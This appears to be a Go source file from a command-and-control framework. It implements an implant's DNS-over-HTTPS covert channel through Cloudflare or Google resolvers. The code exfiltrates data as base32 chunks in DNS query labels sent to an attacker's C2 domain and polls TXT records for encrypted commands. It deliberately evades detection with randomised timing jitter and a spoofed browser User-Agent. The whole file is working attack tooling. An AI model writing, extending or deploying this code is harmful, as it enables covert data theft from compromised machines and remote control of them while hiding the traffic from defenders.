// Package transport provides alternative C2 beacon transports.
// doh.go implements a DNS-over-HTTPS covert channel that tunnels agent
// data inside DNS TXT record queries to Cloudflare or Google DoH resolvers.
//
// Protocol:
//   Checkin / result upload (agent → server):
//     Agent encodes payload as base32 chunks and issues A-record queries for
//     labels of the form: <seq>.<chunk>.<session>.<c2domain>
//     Each query is answered with a synthetic A record; the server reassembles
//     chunks from its authoritative DNS listener (separate component).
//
//   Command poll (server → agent):
//     Agent issues a TXT query for poll.<session>.<c2domain>
//     Server responds with a TXT record containing the base64-encoded,
//     encrypted command payload. The DoH resolver acts as a transparent proxy.
//
// In this implementation the agent side uses the DoH JSON API:
//   https://cloudflare-dns.com/dns-query?name=<label>&type=TXT
//   https://dns.google/resolve?name=<label>&type=TXT
//
// The C2 server requires a real DNS zone (c2domain) with an authoritative
// nameserver that can serve synthesised responses. See wiki/19-doh.md.
package transport

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

// DoHProvider selects which public DoH resolver to use.
type DoHProvider string

const (
	DoHCloudflare DoHProvider = "cloudflare"
	DoHGoogle     DoHProvider = "google"

	// Max bytes per DNS label (RFC 1035: 63 chars). base32 uses A–Z2–7.
	// Each label carries floor(63/8)*5 = 35 raw bytes.
	dohChunkBytes = 35
	// Max number of labels per query (stay under 253 char total name limit).
	dohMaxChunks = 3
)

var dohEndpoints = map[DoHProvider]string{
	DoHCloudflare: "https://cloudflare-dns.com/dns-query",
	DoHGoogle:     "https://dns.google/resolve",
}

// DoHClient implements the C2 beacon over DNS-over-HTTPS.
type DoHClient struct {
	C2Domain  string      // authoritative domain for C2 (e.g. "c2.example.com")
	SessionID string      // 8-char hex session tag (stable, derived from agent ID)
	Provider  DoHProvider // which DoH resolver to use
	client    *http.Client
}

// NewDoHClient constructs a DoH transport client.
func NewDoHClient(c2domain, agentID string, provider DoHProvider) *DoHClient {
	if provider == "" {
		provider = DoHCloudflare
	}
	// Stable 8-char session tag derived from agent ID
	sid := agentID
	if len(sid) > 8 {
		sid = sid[:8]
	}
	return &DoHClient{
		C2Domain:  c2domain,
		SessionID: sid,
		Provider:  provider,
		client: &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				// Force DoH over TLS — looks like normal HTTPS
				DisableKeepAlives: false,
			},
		},
	}
}

// SendData encodes payload as a stream of DNS TXT queries to the C2 domain.
// Each chunk is sent as: <seq>.<b32chunk>.<session>.<c2domain>
// Returns nil on success (the server acknowledges via synthetic NOERROR).
func (d *DoHClient) SendData(payload []byte) error {
	b32 := base32.StdEncoding.WithPadding(base32.NoPadding)
	encoded := strings.ToLower(b32.EncodeToString(payload))

	// Split into label-safe chunks
	chunks := splitIntoChunks(encoded, dohChunkBytes*8/5) // base32 chars per chunk

	for i := 0; i < len(chunks); i += dohMaxChunks {
		batch := chunks[i:]
		if len(batch) > dohMaxChunks {
			batch = batch[:dohMaxChunks]
		}
		label := fmt.Sprintf("d%d.%s.%s.%s",
			i/dohMaxChunks,
			strings.Join(batch, "."),
			d.SessionID,
			d.C2Domain,
		)
		if err := d.queryTXT(label); err != nil {
			return fmt.Errorf("DoH send chunk %d: %w", i, err)
		}
		// Randomised inter-query delay to avoid timing correlation
		jitter := time.Duration(rand.Intn(500)+100) * time.Millisecond
		time.Sleep(jitter)
	}
	return nil
}

// PollCommand queries the C2 server for a pending command.
// Issues a TXT query for: poll.<session>.<c2domain>
// Returns nil, nil when there is no pending command (NXDOMAIN / empty TXT).
func (d *DoHClient) PollCommand() ([]byte, error) {
	label := fmt.Sprintf("poll.%s.%s", d.SessionID, d.C2Domain)
	txt, err := d.queryTXTResponse(label)
	if err != nil {
		return nil, fmt.Errorf("DoH poll: %w", err)
	}
	if txt == "" {
		return nil, nil
	}
	// TXT record is base64-encoded encrypted command payload
	data, err := base64.StdEncoding.DecodeString(txt)
	if err != nil {
		return nil, fmt.Errorf("DoH poll decode: %w", err)
	}
	return data, nil
}

// ── private helpers ───────────────────────────────────────────────────────────

type dohResponse struct {
	Status   int         `json:"Status"`
	Answer   []dohRecord `json:"Answer"`
}

type dohRecord struct {
	Name string `json:"name"`
	Type int    `json:"type"`
	Data string `json:"data"`
}

func (d *DoHClient) queryTXT(name string) error {
	_, err := d.queryTXTResponse(name)
	return err
}

func (d *DoHClient) queryTXTResponse(name string) (string, error) {
	endpoint, ok := dohEndpoints[d.Provider]
	if !ok {
		endpoint = dohEndpoints[DoHCloudflare]
	}

	url := fmt.Sprintf("%s?name=%s&type=TXT", endpoint, name)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/dns-json")
	// Blend with legitimate browser DoH traffic
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := d.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	var dnsResp dohResponse
	if err := json.Unmarshal(body, &dnsResp); err != nil {
		return "", fmt.Errorf("DoH JSON parse: %w", err)
	}

	// Status 0 = NOERROR, 3 = NXDOMAIN (no command)
	if dnsResp.Status == 3 || len(dnsResp.Answer) == 0 {
		return "", nil
	}
	if dnsResp.Status != 0 {
		return "", fmt.Errorf("DoH RCODE %d", dnsResp.Status)
	}

	// Return first TXT record (strip surrounding quotes)
	for _, rec := range dnsResp.Answer {
		if rec.Type == 16 { // TXT
			return strings.Trim(rec.Data, "\""), nil
		}
	}
	return "", nil
}

func splitIntoChunks(s string, size int) []string {
	var chunks []string
	for len(s) > size {
		chunks = append(chunks, s[:size])
		s = s[size:]
	}
	if len(s) > 0 {
		chunks = append(chunks, s)
	}
	return chunks
}
